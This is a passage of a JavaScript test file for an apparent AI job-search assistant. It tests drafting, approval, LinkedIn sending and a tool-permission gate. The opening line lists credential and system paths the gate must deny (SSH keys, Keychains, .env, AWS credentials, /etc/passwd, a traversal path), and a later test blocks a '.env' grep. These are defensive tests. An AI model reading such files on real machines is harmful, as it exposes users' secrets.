  for (const no of ["/Users/sam/.ssh/id_rsa", "/Users/sam/.sellme/state.json", "/Users/sam/Library/Keychains/x", "/Users/sam/Documents/.env", "/Users/sam/Documents/aws-credentials.csv", "/Users/sam/Documents/server.pem", "/Users/sam", "/etc/passwd", "/Users/sam/../other/x", undefined]) assert.equal(researchable(no, h), false, String(no));
  const s = freshState();
  const read = (name, input) => gate({ tool_name: name, tool_input: input }, s, { run: "r" }).decision;
  const home = os.homedir();
  assert.equal(read("Read", { file_path: path.join(home, "Documents", "x.md") }), "allow");
  assert.equal(read("Read", { file_path: path.join(home, ".sellme", "state.json") }), "deny", "the floor lives there");
  assert.equal(read("Grep", { pattern: "LangGraph" }), "deny", "a folder has to be named");
  assert.equal(read("Grep", { pattern: "LangGraph", path: path.join(home, "Documents"), glob: "**/.env" }), "deny");
  assert.equal(read("Grep", { pattern: "LangGraph", path: path.join(home, "Documents") }), "allow");
});

test("a run can search Notion, but not change it", () => {
  const s = freshState();
  const mcp = (tool) => gate({ tool_name: `mcp__notion__${tool}`, tool_input: {} }, s, { run: "r" }).decision;
  assert.equal(mcp("notion-search"), "allow");
  assert.equal(mcp("notion-fetch"), "allow");
  assert.equal(mcp("notion-create-pages"), "deny");
  assert.equal(mcp("notion-update-page"), "deny");
});

test("a suggestion looks for the user's real answer first, and only hands back text to check", async () => {
  const { researchSuggest } = await import("../lib/agent.js");
  const s = freshState();
  core.addRecruiter(s, "Dana Ford", { handle: "ben@talent.example" });
  const q = core.addBlock(s, { agent: "Dana Ford", asked: "Yes or no on LangGraph?", reason: "Your facts don't name it" });
  let prompt;
  const runner = async (p) => {
    prompt = p;
    return { ok: true, output: 'Looked.\n{"text": "Yes, I used LangGraph for an agent prototype.", "sources": [], "why": "LangGraph: your Oct 3 call"}' };
  };
  const result = await researchSuggest(s, q, { runner });
  assert.equal(result.text, "Yes, I used LangGraph for an agent prototype.");
  assert.match(prompt, /email, call notes \(Wispr Flow\) and notes \(Notion/);
  assert.match(prompt, /never someone else's words/);
  assert.deepEqual(await researchSuggest(s, q, { runner: async () => ({ stopped: true }) }), { failed: "stopped" });
});

test("an email reads like one: greeting, body and sign-off on their own lines, with only spacing changed", () => {
  const text = "Hi Dana and Tom, thanks for reaching out. I added my times through the link. Looking forward to it. Best, Sam";
  assert.equal(core.emailLayout(text), "Hi Dana and Tom,\n\nThanks for reaching out. I added my times through the link. Looking forward to it.\n\nBest,\nSam");
  assert.equal(core.emailLayout("Thanks so much for the help."), "Thanks so much for the help.", "no greeting or name, left alone");
  assert.equal(core.emailLayout("Hi Sam,\n\nAlready laid out."), "Hi Sam,\n\nAlready laid out.");
  const s = freshState();
  s.autopilot = false;
  core.addRecruiter(s, "Lee Park", { handle: "lee@talent.example" });
  core.addRecruiter(s, "Dana Ford", { handle: "+15550001234" });
  const mail = core.addDraft(s, { agent: "Lee Park", text: "Hi Lee, happy to chat. Best, Sam", kind: "nudge" });
  const sms = core.addDraft(s, { agent: "Dana Ford", text: "Hi Dana, happy to chat. Best, Sam", kind: "nudge" });
  core.approve(s, mail.id);
  core.approve(s, sms.id);
  assert.equal(mail.approved_text, "Hi Lee,\n\nHappy to chat.\n\nBest,\nSam");
  assert.equal(mail.text, mail.approved_text, "what's approved is what's sent");
  assert.equal(sms.approved_text, "Hi Dana, happy to chat. Best, Sam", "a text stays one line");
  assert.deepEqual(card(mail, palette(false), "", 60).split("\n").filter((l) => /Lee,|Happy|Best|Sam/.test(l)).map((l) => l.replace(/^\s*│\s*/, "").replace(/\s*│$/, "")), ["Hi Lee,", "Happy to chat.", "Best,", "Sam"]);
});

test("a long card scrolls with its choices pinned, and starts at the top", () => {
  const lines = Array.from({ length: 40 }, (_, i) => `line ${i}`);
  const first = scrolled(lines, 12, 0);
  assert.equal(first.shown.length, 12); // Always the same height, so the choices under it never jump.
  assert.equal(first.shown[0], "");
  assert.equal(first.shown[1], "line 0");
  assert.equal(first.shown.at(-1), "  ↓ 30 more lines");
  const last = scrolled(lines, 12, 999);
  assert.equal(last.top, 30);
  assert.equal(last.shown[0], "  ↑ 30 more lines");
  assert.equal(last.shown.at(-2), "line 39");
  assert.equal(last.shown.at(-1), "");
  assert.deepEqual(scrolled(["a", "b"], 12, 5), { shown: ["a", "b"], top: 0, max: 0 });
});

test("the wheel scrolls a few lines and PgUp/PgDn a screen", () => {
  assert.equal(scrollBy("wheelup", 20), -3);
  assert.equal(scrollBy("wheeldown", 20), 3);
  assert.equal(scrollBy("pagedown", 20), 17);
  assert.equal(scrollBy("pageup", 20), -17);
  assert.equal(scrollBy("up", 20), 0); // Arrows still move the choice.
});

test("a rewrite follows the user's own word about themselves, and only refuses invented credentials", async () => {
  const { s, q } = noted();
  const prompt = rewritePrompt(s, q);
  assert.match(prompt, /The user's note is their own word about themselves/);
  assert.match(prompt, /Warmth, enthusiasm and a confident framing/);
  assert.match(prompt, /never do is invent a credential/);
  assert.doesNotMatch(prompt, /Claim only what the facts below say/);
  const result = await rewrite(s, q, { tool: TOOL, run: answer({ text: "Hi Alex, I just signed up after your message and would love to chat!", sources: [], why: "Left out the existing thread." }) });
  assert.equal(result.changed, "Left out the existing thread.");
  assert.equal(core.applyRewrite(s, q.id, result).status, "pending");
});

test("a reply with a blank in it offers only to fill it in, and can't be sent", () => {
  const s = freshState();
  s.setup_done = true;
  core.addAgent(s, "Fonzi");
  const q = core.addBlock(s, { agent: "Fonzi", asked: "How many users?", reason: "Only you know" });
  core.setSuggestion(s, q.id, "About [how many] users.");
  const keys = draftActions(q).map((a) => a.id);
  assert.ok(!keys.includes("send"));
  assert.equal(draftActions(q)[0].label, "Fill in the blank");
  assert.throws(() => core.answerYourself(s, q.id, q.suggestion, { confirmSensitive: true }), /blank/);
  const plain = (x) => x;
  const shown = card(q, { muted: plain, bold: plain, lime: plain, red: plain, violet: plain });
  assert.match(shown, /Has a blank to fill: “\[how many\]”/);
});

test("a note on a draft can look up what it points to, like a call, before the rewrite", async () => {
  const { researchRewrite } = await import("../lib/agent.js");
  const { s, q } = noted("Match the times I said on the Wispr call");
  let asked = "";
  const runner = async (prompt) => {
    asked = prompt;
    return { ok: true, output: JSON.stringify({ text: "Monday afternoon works for Maya.", sources: [], why: null }) };
  };
  const result = await researchRewrite(s, q, { runner });
  assert.match(asked, /Match the times I said on the Wispr call/);
  assert.match(asked, /Wispr Flow/);
  assert.equal(result.text, "Monday afternoon works for Maya.");
  assert.equal(result.was, q.text);
});

test("after a message to an agent that answers fast, a short run stays in that one conversation", async () => {
  const { checkLanes, scheduledRun } = await import("../lib/schedule.js");
  const s = freshState();
  core.addAgent(s, "Jack & Jill");
  core.addAgent(s, "Fonzi");
  core.addRecruiter(s, "Lee Park", { handle: "lee@talent.example" });
  const lanes = checkLanes(s, { platform: "darwin", follow: "jack & jill" });
  assert.deepEqual(lanes.map((l) => l.id), ["websites"]);
  assert.match(lanes[0].prompt, /Your contacts: Jack & Jill\./);
  assert.match(lanes[0].prompt, /sellme wait 45/);
  assert.match(lanes[0].prompt, /up to three rounds/);
  assert.match(lanes[0].prompt, /don't run `sellme ran`/);
  assert.deepEqual(checkLanes(s, { follow: "Nobody" }), []);
  assert.ok(core.answersFast(s.agents[0]) && !core.answersFast(core.findAgent(s, "Lee Park")), "never a person");
  await withSandbox(async () => {
    withState((st) => Object.assign(st, { agents: s.agents, setup_done: true }));
    const prompts = [];
    const result = await scheduledRun({ platform: "linux", follow: "Jack & Jill", runner: async (p) => (prompts.push(p), { ok: true, output: "Jack answered." }) });
    assert.deepEqual(result, { followed: "Jack & Jill", ok: true });
    assert.equal(prompts.length, 1);
    assert.ok(!load().last_run, "a follow-up isn't the hourly check");
    // A just-connected agent with no chat: one run for it, then it's no longer "just connected", or every open repeats it.
    withState((st) => { st.agents.find((a) => a.name === "Fonzi").intro = true; });
    prompts.length = 0;
    const opened = await scheduledRun({ platform: "linux", start: "Fonzi", runner: async (p) => (prompts.push(p), { ok: true, output: "Fonzi has no chat." }) });
    assert.deepEqual(opened, { opened: "Fonzi", ok: true });
    assert.equal(prompts.length, 1, "one lane, not a whole check");
    assert.ok(!load().agents.find((a) => a.name === "Fonzi").intro);
    assert.ok(!load().last_run);
  });
  assert.match(liveLine(0, Date.now(), ["Waiting for their answer"], palette(false), Date.now(), "Jack & Jill"), /Talking with Jack & Jill · Waiting for their answer/);
});

test("a reply can be copied to the clipboard", async () => {
  const { copyText } = await import("../lib/open.js");
  const { EventEmitter } = await import("node:events");
  const got = [];
  const run = (cmd, args) => {
    const child = new EventEmitter();
    child.stdin = { on() {}, end: (t) => { got.push([cmd, t]); setTimeout(() => child.emit("close", cmd === "wl-copy" ? 1 : 0), 1); } };
    return child;
  };
  assert.equal(await copyText("Hi Jack", { platform: "darwin", run }), true);
  assert.deepEqual(got.at(-1), ["pbcopy", "Hi Jack"]);
  assert.equal(await copyText("Hi", { platform: "linux", run }), true, "falls back to xclip");
  assert.deepEqual(got.at(-1), ["xclip", "Hi"]);
  assert.equal(await copyText("Hi", { platform: "sunos", run }), false);
});

test("when the Send click went through but the read-back missed it, a read-only look settles it", () => withSandbox(async () => {
  const { sendOutbox, seeDelivered } = await import("../lib/agent.js");
  const text = "Hi Sam, thanks for reaching out. Yes, I am interested in the role. What is the next step?";
  withState((s) => {
    Object.assign(s, { setup_done: true });
    core.addRecruiter(s, "Sam Ortiz", { handle: "linkedin.com/in/nf-test" });
    const q = core.addDraft(s, { agent: "Sam Ortiz", asked: "Interested?", text, kind: "nudge", thread: "2-AbC123xyz" });
    if (q.status !== "approved") core.approve(s, q.id);
  });
  const id = load().queue[0].id;
  const looks = [];
  const runner = (onPage) => async (prompt, { run, fast }) => {
    if (prompt.startsWith("Check whether")) {
      looks.push(fast.tools);
      seeDelivered({ tool_name: "mcp__claude-in-chrome__get_page_text", tool_response: { content: [{ type: "text", text: onPage }] } }, run);
      return { ok: true, output: "there" };
    }
    withState((s) => {
      const q = s.queue.find((x) => x.id === id);
      q.send_cleared = q.send_confirmed = { run, ts: new Date().toISOString() };
    });
    return { ok: true, output: "failed: the conversation still shows only their message" };
  };
  const missing = await sendOutbox(id, { runner: toolDown(runner("Sam: Forward Deployed Engineers needed")) });
  assert.equal(missing.sent, false, "not in the conversation: still not sent");
  assert.ok(!looks[0].some((t) => /computer/.test(t)), "the look can't type or click");
  const there = await sendOutbox(id, { runner: toolDown(runner(`Sam: needed for 12 months\nRotem Lanyado 9:51 PM\n${text}`)) });
  assert.equal(there.sent, true);
  assert.equal(load().queue[0].status, "sent");
}));

test("trying again after an unseen click looks first, so the message can't go twice", () => withSandbox(async () => {
  const { sendOutbox, seeDelivered } = await import("../lib/agent.js");
  const text = "Hi Sam, thanks for reaching out. Yes, I am interested in the role. What is the next step?";
  withState((s) => {
    Object.assign(s, { setup_done: true });
    core.addRecruiter(s, "Sam Ortiz", { handle: "linkedin.com/in/nf-test" });
    const q = core.addDraft(s, { agent: "Sam Ortiz", asked: "Interested?", text, kind: "nudge", thread: "2-AbC123xyz" });
    if (q.status !== "approved") core.approve(s, q.id);
    Object.assign(q, { send_cleared: { run: "old", ts: new Date(Date.now() - 600_000).toISOString() }, send_confirmed: { run: "old", ts: new Date().toISOString() } });
  });
  const id = load().queue[0].id;
  const prompts = [];
  const runner = async (prompt, { run }) => {
    prompts.push(prompt.split("\n")[0]);
    seeDelivered({ tool_name: "mcp__claude-in-chrome__get_page_text", tool_response: { content: [{ type: "text", text }] } }, run);
    return { ok: true, output: "there" };
  };
  assert.equal((await sendOutbox(id, { runner: toolDown(runner) })).sent, true);
  assert.deepEqual(prompts, ["Check whether one message already went out. Only read: never type, click or press anything."], "only the look ran, never the send");
}));

test("talking a draft over: SELLME knows the draft, the check and the talk so far, and a change still gets checked", async () => {
  const { chatPrompt, parseChat, chatTurn } = await import("../lib/rewrite.js");
  const s = freshState();
  s.setup_done = true;
  s.profile = { ...s.profile, name: "Maya Test", where: "NYC", floor: "$987K" };
  core.addAgent(s, "Fonzi");
  const q = core.addDraft(s, { agent: "Fonzi", asked: "Interested? Range is 160-90k.", text: "Yes. I read the range as $160k to $190k.", sources: ["profile.where"] });
  const history = [{ who: "you", text: "why is this flagged?" }];
  const prompt = chatPrompt(s, q, history);
  assert.match(prompt, /Current draft: Yes\. I read the range/);
  assert.match(prompt, /The check says: .*pay/);
  assert.match(prompt, /User: why is this flagged\?/);
  assert.doesNotMatch(prompt, /987K/, "the floor never reaches the AI");
  assert.deepEqual(parseChat('{"say": "It mentions pay.", "text": null}', s, q), { say: "It mentions pay.", text: null, sources: [], remember: [], others: [] });
  const changed = parseChat('{"say": "Shorter now.", "text": "Yes, glad to talk.", "sources": ["profile.where", "made-up"]}', s, q);
  assert.equal(changed.text, "Yes, glad to talk.");
  assert.ok(!changed.sources.includes("made-up"));
  assert.match(parseChat("not json", s, q).refused, /form I could read/);
  const turn = await chatTurn(s, q, history, { tool: { id: "claude", name: "Claude Code", args: [] }, run: async () => '{"say": "Because it talks pay."}' });
  assert.equal(turn.say, "Because it talks pay.");
});

test("a message the user attaches the resume to themselves is sent as written, not refused for the missing file", async () => {
  const { linkedinChromePlan, fastPlan } = await import("../lib/agent.js");
  const s = freshState();
  core.addRecruiter(s, "Dana Ford", { handle: "linkedin.com/in/ben-ford-test" });
  const q = core.addDraft(s, { agent: "Dana Ford", asked: "Send your resume?", text: "Sure. Here's my resume.", sources: ["user"], thread: "2-AbC123xyz" });
  q.attach = "manual";
  if (q.status !== "approved") core.approve(s, q.id, { confirmSensitive: true });
  const o = core.outbox(s).find((x) => x.id === q.id);
  assert.equal(o.attach_yourself, true);
  assert.match(linkedinChromePlan(o).prompt, /attaches it themselves right after it sends/);
  assert.match(fastPlan({ channel: "imessage", to: "+15550111", text: "Here's my resume.", attach_yourself: true }).prompt, /don't stop over the missing file/);
  assert.doesNotMatch(linkedinChromePlan({ ...o, attach_yourself: undefined }).prompt, /attaches it themselves/);
});

test("talking one draft over can draft a message to another contact, which lands on the list for its own yes", async () => {
  const { chatPrompt, parseChat } = await import("../lib/rewrite.js");
  const s = freshState();
  s.setup_done = true;
  s.profile = { ...s.profile, name: "Maya Test" };
  core.addAgent(s, "Standout", { channel: "imessage", handle: "+15550002222" });
  core.addRecruiter(s, "Dana Ford", { handle: "dana@talent.example", company: "Northwind Staffing" });
  const q = core.addDraft(s, { agent: "Dana Ford", asked: "Want me to submit you to Acme?", text: "Yes, please go ahead.", sources: ["user"] });
  const prompt = chatPrompt(s, q, [{ who: "you", text: "tell Standout not to submit me to Acme" }]);
  assert.match(prompt, /- Standout: an agent, as Maya Test's AI agent/);
  assert.doesNotMatch(prompt, /- Dana Ford \(/, "the draft's own contact isn't an other");
  const out = parseChat(JSON.stringify({ say: "It's on your list.", text: null, others: [{ to: "Standout", text: "Please don't submit Maya to Acme." }, { to: "Nobody", text: "Hi." }, { to: "Dana Ford", text: "Hi." }] }), s, q);
  assert.deepEqual(out.others, [{ to: "Standout", text: "Please don't submit Maya to Acme.", sources: [], kind: "nudge", company: null }], "only the user's other contacts");
  // Standout was written to a minute ago: SELLME's own nudge would wait, but the user asked for this one.
  s.queue.push({ id: "q90", agent: "Standout", status: "sent", sent_at: new Date().toISOString(), text: "Any new matches?" });
  assert.throws(() => core.addDraft(s, { agent: "Standout", text: "Please don't submit Maya to Acme.", kind: "nudge" }));
  const made = core.addDraft(s, { agent: "Standout", text: "Please don't submit Maya to Acme.", kind: "nudge", byUser: true, context: "You asked for this while discussing the Dana Ford draft." });
  assert.ok(["pending", "approved"].includes(made.status) || made.status === "blocked");
  assert.notEqual(made.status, "sent", "nothing goes out without the user's yes");
  assert.ok(core.openItems(s).includes(made) || made.status === "approved");
});

test("dragging copies what's on screen, without the bar beside a draft or the padding after a line", () => {
  const rows = ["  Your reply", "  │ Maya led a team of 6.   ", "  │ Happy to talk.", "  ┃ Best, Maya"];
  assert.equal(selectionText(rows, { x: 4, y: 1 }, { x: 11, y: 1 }), "Maya led");
  assert.equal(selectionText(rows, { x: 11, y: 1 }, { x: 4, y: 1 }), "Maya led", "either direction");
  assert.equal(selectionText(rows, { x: 4, y: 1 }, { x: 40, y: 3 }), "Maya led a team of 6.\nHappy to talk.\nBest, Maya");
  assert.equal(selectionText(rows, { x: 2, y: 0 }, { x: 5, y: 0 }), "Your");
});

test("a selection reads the plain screen, with color and links gone and a long line split where it wraps", () => {
  const rows = screenRows({ lines: ["\x1b[1mhello\x1b[0m", "\x1b]8;;https://a.example\x1b\\link\x1b]8;;\x1b\\", "abcdefghijkl"], rows: [0, 1, 2] }, 5);
  assert.deepEqual(rows, ["hello", "link", "abcde", "fghij", "kl"]);
});

test("no screen offers keys that are gone: v to select and q to quit", () => {
  for (const tab of ["Inbox", "Agents", "Pipeline", "Schedule"]) assert.doesNotMatch(footerLine(tab, 200), /select text|q quit/);
  assert.match(footerLine("Pipeline", 140), /d delete/);
});

test("a newer message from them drops the draft answering their older one, but two questions in one message both stay", () => {
  const s = state();
  core.addAgent(s, "Lee Park", { channel: "self", handle: "lee@acme.example" });
  const old = core.addDraft(s, { agent: "Lee Park", asked: "Can you do Tuesday?", text: "Tuesday works for Maya.", kind: "reply", company: "Acme", received: new Date(Date.now() - 2 * 864e5).toISOString() });
  const other = core.addDraft(s, { agent: "Lee Park", asked: "And for Globex?", text: "Happy to talk Globex.", company: "Globex", received: new Date(Date.now() - 2 * 864e5).toISOString() });
  old.created = other.created = new Date(Date.now() - 864e5).toISOString();
  const first = core.addDraft(s, { agent: "Lee Park", asked: "Actually, Thursday?", text: "Thursday works for Maya.", company: "Acme", received: new Date(Date.now() - 3600e3).toISOString() });
  const second = core.addDraft(s, { agent: "Lee Park", asked: "And remote?", text: "Remote works for Maya.", company: "Acme", received: first.received });
  assert.equal(old.status, "skipped");
  assert.equal(old.superseded_by, first.id);
  assert.ok(s.notes.some((n) => /wrote again/.test(n.text)));
  assert.notEqual(other.status, "skipped", "another company's conversation is left alone");
  assert.notEqual(first.status, "skipped", "two questions from the same message both stay");
  assert.notEqual(second.status, "skipped");
  assert.throws(() => core.addDraft(s, { agent: "Lee Park", text: "x", received: "yesterday-ish" }), /can’t read/);
});

test("the list says what each item needs in words, and how long ago their message came, newest first", () => {
  const s = state();
  core.addAgent(s, "Lee Park", { channel: "self", handle: "lee@acme.example" });
  core.addAgent(s, "Kai Moss", { channel: "self", handle: "kai@acme.example" });
  const fact = core.addFact(s, "Works remotely", "resume");
  core.addDraft(s, { agent: "Lee Park", asked: "Remote?", text: "Yes, remote works.", sources: [fact.id], received: new Date(Date.now() - 3 * 3600e3).toISOString() });
  core.addDraft(s, { agent: "Kai Moss", asked: "What salary?", text: "Happy to talk pay on a call.", sources: [fact.id], received: new Date(Date.now() - 5 * 60e3).toISOString() });
  const rows = draftRows(s).filter((r) => r.draft);
  assert.deepEqual(rows.map((r) => r.agent), ["Kai Moss", "Lee Park"]);
  assert.deepEqual(rows.map((r) => r.status.label), ["check: pay", "ready to send"]);
  assert.deepEqual(rows.map((r) => r.text), ["email · sent 5m ago", "email · sent 3h ago"]);
  const line = draftLine(rows[0], " ", c, 80);
  assert.doesNotMatch(line, /happy to talk/i, "no preview of the draft");
});

test("the card is a chat: who wrote and when over their bubble, the reply on the right", () => {
  const q = { agent: "Lee Park", channel: "self", to: "lee@acme.example", from: "Lee Park · Acme", received: new Date(Date.now() - 2 * 3600e3).toISOString(), asked: "Can you send your availability?", text: "Maya is free Tuesday after 2.", status: "pending", sources: ["f1"], check: { reasons: [] } };
  const lines = card(q, c, "", 80).split("\n");
  const sender = lines.findIndex((l) => l.includes("Lee Park · Acme"));
  assert.match(lines[sender], /Lee Park · Acme  .*· 2h ago$/, "who and when on one line");
  assert.match(lines[sender + 2], /^  │ Can you send your availability\? │$/);
  const mine = lines.find((l) => l.includes("Maya is free"));
  assert.ok(mine.indexOf("│") > 20, "the reply sits on the right");
  assert.equal(selectionText([mine], { x: 0, y: 0 }, { x: 200, y: 0 }), "Maya is free Tuesday after 2.", "copying it leaves the bubble behind");
});

test("an older draft's header comes out of its text: who and when go by the name, the box holds only what they said", () => {
  const now = new Date("2026-11-09T12:00:00");
  const one = theirMessage({ agent: "Kai", asked: 'Dana Ford, Acme, Nov 6, 12:16 PM: "When you first looked at it, what stood out?"' }, now.getTime());
  assert.equal(one.from, "Dana Ford, Acme");
  assert.equal(one.text, "When you first looked at it, what stood out?");
  assert.equal(new Date(one.when.iso).getDate(), 6);
  assert.equal(one.when.dateOnly, false);
  const dateOnly = theirMessage({ agent: "Kai", asked: "Kai Moss, Nov 8: wants to tell you about the role." }, now.getTime());
  assert.deepEqual([dateOnly.text, sentLine(dateOnly.when, now.getTime())], ["wants to tell you about the role.", "Sun, Nov 8 · yesterday"]);
  assert.equal(new Date(theirMessage({ agent: "K", asked: "Kai, Dec 20: hi" }, now.getTime()).when.iso).getFullYear(), 2025, "never in the future");
  const plain = theirMessage({ agent: "Kai", asked: "Can you do Tuesday: 2pm or 4pm?" }, now.getTime());
  assert.deepEqual([plain.from, plain.when, plain.text], ["Kai", null, "Can you do Tuesday: 2pm or 4pm?"], "a message that just has a colon is left alone");
  const lines = card({ agent: "Kai", channel: "mcp", asked: 'Dana Ford, Acme, Nov 6, 12:16 PM: "Hello there"', text: "Hi", status: "pending", check: { reasons: [] } }, c, "", 80).split("\n");
  assert.match(lines.find((l) => l.includes("Dana Ford")), /Dana Ford, Acme  Fri, Nov 6, 12:16 PM · \d+d ago/);
  assert.ok(lines.some((l) => /^  │ Hello there │$/.test(l)));
});

test("a LinkedIn reply goes into its conversation in Chrome, never through the tool that opens a new chat", () => withSandbox(async () => {
  const { sendOutbox } = await import("../lib/agent.js");
  withState((s) => {
    Object.assign(s, { setup_done: true });
    core.addRecruiter(s, "Dana Ford", { handle: "linkedin.com/in/ben-ford-test" });
    const q = core.addDraft(s, { agent: "Dana Ford", asked: "Talk today?", text: "Yes, glad to.", kind: "nudge", thread: "2-AbC123xyz" });
    if (q.status !== "approved") core.approve(s, q.id);
  });
  const id = load().queue[0].id;
  const plans = [];
  const chrome = async (_, { run, fast }) => {
    plans.push(fast);
    withState((s) => {
      const q = s.queue.find((x) => x.id === id);
      q.send_cleared = { run, ts: new Date().toISOString() };
      q.send_confirmed = { run, ts: new Date().toISOString() };
    });
    return { ok: true, output: "sent" };
  };
  assert.equal((await sendOutbox(id, { runner: chrome })).sent, true);
  assert.deepEqual(plans.map((p) => Boolean(p.chrome)), [true]);
  assert.ok(!plans[0].tools.includes("mcp__linkedin__send_message"));
  // The gate refuses the tool's send_message on a reply, from any run.
  withState((s) => Object.assign(s.queue.find((x) => x.id === id), { status: "approved", sent_at: null, send_cleared: null, send_confirmed: null }));
  const said = gate({ tool_name: "mcp__linkedin__send_message", tool_input: { linkedin_username: "linkedin.com/in/ben-ford-test", message: "Yes, glad to.", confirm_send: true } }, load(), { run: "r9" });
  assert.equal(said.decision, "deny");
  assert.match(said.reason, /new LinkedIn chat/);
}));

// ---------------------------------------------------------------- LinkedIn's one session
test("LinkedIn sign-in trouble is read from a run's words, and a sent message isn't", async () => {
  const { saysSignedOut } = await import("../lib/linkedin.js");
  for (const t of ["failed: the LinkedIn session expired and a login window opened.", "LinkedIn sign-in was still in progress, so the message was not sent.", "Error: Page.goto: net::ERR_TOO_MANY_REDIRECTS", "LinkedIn showed a sign-in page that asks for the password"]) assert.ok(saysSignedOut(t), t);
  for (const t of ["sent", "Read 3 conversations, nothing new.", "Dana asked about a sign-in bonus"]) assert.ok(!saysSignedOut(t), t);
});

test("only one SELLME run uses LinkedIn at a time, and a lock left by a dead process doesn't block it", async () => {
  const { withLinkedin } = await import("../lib/linkedin.js");
  const file = path.join(fs.mkdtempSync(path.join(os.tmpdir(), "sellme-li-")), "linkedin.lock");
  const order = [];
  const slow = (name) => withLinkedin(async () => { order.push(`${name} in`); await new Promise((r) => setTimeout(r, 30)); order.push(`${name} out`); return name; }, { file, poll: 5 });
  assert.deepEqual(await Promise.all([slow("a"), slow("b")]), ["a", "b"]);
  assert.deepEqual(order, ["a in", "a out", "b in", "b out"]);
  fs.writeFileSync(file, JSON.stringify({ pid: 999999, at: Date.now() }));
  assert.equal(await withLinkedin(async () => "free", { file }), "free", "a dead process's lock is cleared");
  fs.writeFileSync(file, JSON.stringify({ pid: process.pid, at: Date.now() }));
  assert.deepEqual(await withLinkedin(async () => "never", { file, wait: 20, poll: 5 }), { busy: true });
  fs.rmSync(file);
});

test("a run leaves the LinkedIn tool alone unless it's the LinkedIn lane", () => {
  const args = agentArgs("/sellme run", { settings: "s.json", persona: "p.md" });
  assert.equal(args[args.indexOf("--disallowedTools") + 1], "mcp__linkedin");
  assert.ok(!agentArgs("/sellme run", { settings: "s.json", persona: "p.md", linkedin: true }).includes("--disallowedTools"));
});

test("once LinkedIn signs SELLME out, nothing calls it again until the user signs in", () => withSandbox(async () => {
  const { sendOutbox } = await import("../lib/agent.js");
  const { checkLanes } = await import("../lib/schedule.js");
  withState((s) => {
    Object.assign(s, { setup_done: true });
    core.addRecruiter(s, "Dana Ford", { handle: "linkedin.com/in/danaford7" });
    core.addRecruiter(s, "Sam Rivera", { handle: "linkedin.com/in/samrivera42" });
    for (const [agent, thread] of [["Dana Ford", "2-AbC123xyz"], ["Sam Rivera", null]]) {
      // Sam's is a first message: nothing asked, no conversation yet.
      const q = core.addDraft(s, { agent, ...(thread ? { asked: "Talk today?", thread } : {}), text: `Hi ${agent}, glad to connect.`, kind: "nudge" });
      if (q.status !== "approved") core.approve(s, q.id);
    }
  });
  const [reply, first] = load().queue.map((q) => q.id);
  const plans = [];
  const expired = async (_, { fast }) => { plans.push(fast); return { ok: false, output: "failed: the LinkedIn session expired and a login window opened.", failed: "Claude Code stopped" }; };
  await sendOutbox(first, { runner: expired });
  assert.equal(load().connections.LinkedIn?.status, "signin", "the sign-in is recorded");
  plans.length = 0;
  assert.match((await sendOutbox(first, { runner: expired })).why, /signed SELLME out/);
  assert.equal(plans.length, 0, "a first message waits: no tool call, no new sign-in window");
  await sendOutbox(reply, { runner: expired });
  assert.ok(plans.length && plans.every((p) => p.chrome), "a reply goes through Chrome, never the LinkedIn tool");
  assert.ok(plans.every((p) => !p.tools?.some((t) => t.startsWith("mcp__linkedin"))), "not even to look the conversation up");
  withState((s) => { s.queue.find((q) => q.id === reply).thread = null; });
  plans.length = 0;
  assert.match((await sendOutbox(reply, { runner: expired })).why, /signed SELLME out/, "with no conversation on record it waits");
  assert.equal(plans.length, 0);
  const lanes = checkLanes(load(), { platform: "linux" }).map((l) => l.id);
  assert.ok(!lanes.includes("linkedin"), "a check skips LinkedIn while it's signed out");
  // Signing in again (the connect step) turns it back on.
  withState((s) => core.setConnection(s, "LinkedIn", "ok"));
  assert.ok(checkLanes(load(), { platform: "linux" }).map((l) => l.id).includes("linkedin"));
}));

test("the LinkedIn sign-in is the LinkedIn tool's own --login, from the user's settings", () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "sellme-home-"));
  fs.writeFileSync(path.join(dir, ".claude.json"), JSON.stringify({ mcpServers: { linkedin: { command: "/opt/uv", args: ["run", "-m", "linkedin_mcp_server"], env: { A: "1" } } } }));
  const steps = stepsFor({ name: "LinkedIn", kind: "signin", url: null }, [], { login: () => linkedinLoginFrom(dir) });
  assert.equal(steps[0].kind, "run");
  assert.deepEqual([steps[0].bin, ...steps[0].args], ["/opt/uv", "run", "-m", "linkedin_mcp_server", "--login"]);
  assert.deepEqual(steps[0].env, { A: "1" });
  assert.equal(stepsFor({ name: "LinkedIn", kind: "signin", url: null }, [], { login: () => null })[0].kind, "text");
});

test("a run closes the tab it opened before it can finish, and opens no second one after", () => {
  const browser = { run: "r", tabs: {}, refs: {}, typed: {}, urls: {} };
  learnFromTool({ tool_name: CHROME("tabs_create_mcp"), tool_input: {}, tool_response: [{ type: "text", text: tabLine(31, "New Tab", "chrome://newtab/") }] }, browser);
  const stop = JSON.parse(stopReply(browser));
  assert.equal(stop.decision, "block");
  assert.match(stop.reason, /tabs_close_mcp with tabId 31/);
  assert.equal(stopReply(browser, { stop_hook_active: true }), "", "it asks once, never loops");
  learnFromTool({ tool_name: CHROME("tabs_close_mcp"), tool_input: { tabId: 31 }, tool_response: [{ type: "text", text: "closed" }] }, browser);
  assert.equal(stopReply(browser), "", "closed: it may finish");
  assert.equal(gate({ tool_name: CHROME("tabs_create_mcp"), tool_input: {} }, freshState(), { run: "r", browser }).decision, "deny", "one tab per run, even after closing it");
});

test("only a LinkedIn send opens a LinkedIn conversation, so a check's browser run never adds a LinkedIn tab", () => {
  const s = freshState();
  core.addRecruiter(s, "Dana Ford", { handle: "linkedin.com/in/danaford7" });
  const q = core.addDraft(s, { agent: "Dana Ford", asked: "Talk?", text: "Yes, glad to.", kind: "nudge", thread: "2-AbC123xyz" });
  if (q.status !== "approved") core.approve(s, q.id);
  const nav = (linkedin) => gate({ tool_name: CHROME("navigate"), tool_input: { url: "https://www.linkedin.com/messaging/thread/2-AbC123xyz/" } }, s, { run: "r", linkedin }).decision;
  assert.equal(nav(true), "allow");
  assert.equal(nav(false), "deny");
});

test("the tab a run's tabs_context_mcp makes counts as its own, in the words Claude in Chrome really uses", () => {
  const browser = { run: "r", tabs: {}, refs: {}, typed: {}, urls: {} };
  learnFromTool({ tool_name: CHROME("tabs_context_mcp"), tool_input: { createIfEmpty: true }, tool_response: [{ type: "text", text: '{"availableTabs":[{"tabId":1320382639,"title":"New Tab","url":"chrome://newtab/"}],"tabGroupId":17}\n\nTab Context:\n- Available tabs:\n  • tabId 1320382639: "New Tab" ("chrome://newtab/")' }] }, browser);
  assert.deepEqual(browser.opened, ["1320382639"]);
